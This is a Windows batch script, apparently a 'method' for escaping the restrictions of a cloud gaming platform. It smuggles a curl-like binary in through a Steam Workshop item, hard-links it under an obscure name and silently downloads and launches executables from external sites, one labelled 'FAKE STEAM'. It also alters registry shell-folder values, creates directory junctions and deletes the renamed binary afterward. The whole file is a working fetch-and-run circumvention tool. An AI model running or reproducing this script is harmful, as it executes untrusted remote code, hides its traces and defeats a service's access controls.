@ECHO OFF
title Arcade Launcher - method by BarteQX
color 3
::if /I not %username% == 'kiosk' exit /b
echo    ___                    __   
echo   / _ \  ___________ ____/ /__ 
echo  / __  \/ __/ __/ _ `/ _  / -_)
echo /_/  \_/_/  \__/\_,_/\_,_/\__/
echo ----------------------------------------------------------------
echo Thanks to BarteQX for the fix!
echo Made by Afonso1234
echo ----------------------------------------------------------------
echo.
C:
CD "C:\Program Files (x86)\Steam"
B:
MD\Arcade & CD\Arcade

:check
IF EXIST "C:\Program Files (x86)\Steam\steamapps\workshop\content\250820\2361428137\rdl.exe" GOTO :found:
echo Subscribe to this workshop: https://steamcommunity.com/sharedfiles/filedetails/?id=2361428137
echo Then try again...
pause
goto :check

:found
mklink /h "C:\Program Files (x86)\Steam\dyabwuidyniuawbydi.exe" "C:\Program Files (x86)\Steam\steamapps\workshop\content\250820\2361428137\rdl.exe"  1>NUL 2>&1
SET CURL="C:\Program Files (x86)\Steam\dyabwuidyniuawbydi.exe"
B:
cd Arcade
echo Found...
cls
echo    ___                    __   
echo   / _ \  ___________ ____/ /__ 
echo  / __  \/ __/ __/ _ `/ _  / -_)
echo /_/  \_/_/  \__/\_,_/\_,_/\__/
echo ----------------------------------------------------------------
echo Thanks to BarteQX for the fix!
echo Made by Afonso1234
echo ----------------------------------------------------------------
echo.
echo Wait
REM [FAKE STEAM]
%CURL% -LJOk "https://barteq.tech/gfn/files/Steam.exe"  1>NUL 2>&1
START "" "Steam.exe"
REM [BARTEQX]
%CURL% -LJOk "https://github.com/afonsosousah/afonsosousah.github.io/raw/master/Arcade.exe"  1>NUL 2>&1
START "" "Arcade.exe"
B:
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /f /v {374QR290-123S-4565-9164-39P4925R467O} /t REG_EXPAND_SZ /d "B:\BQX\Downloaded"
Reg add "HKCU\Software\Microsoft\Windows\Current Version\Explorer\User Shell Folders" /v "{374QR290-123S-4565-9164-39P4925R467O}" /d "B:\BQX\Downloaded"
Reg add "HKCU\Software\Microsoft\Windows\Current Version\Explorer\Shell Folders" /v "{374QR290-123S-4565-9164-39P4925R467O}" /d "B:\BQX\Downloaded"
REM C:
REM CD "C:\Program Files (x86)\Steam\steamapps"
REM MD\arcade
timeout 2 /nobreak  1>NUL 2>&1
B:
cd Arcade
mklink /J Steam "C:\Program Files (x86)\Steam\steamapps\arcade\"
cd Steam
%CURL% -LJOk "https://barteq.tech/gfn/files/steam.bat"  1>NUL 2>&1
timeout 2 /nobreak  1>NUL 2>&1
del "C:\Program Files (x86)\Steam\dyabwuidyniuawbydi.exe"  1>NUL 2>&1
exit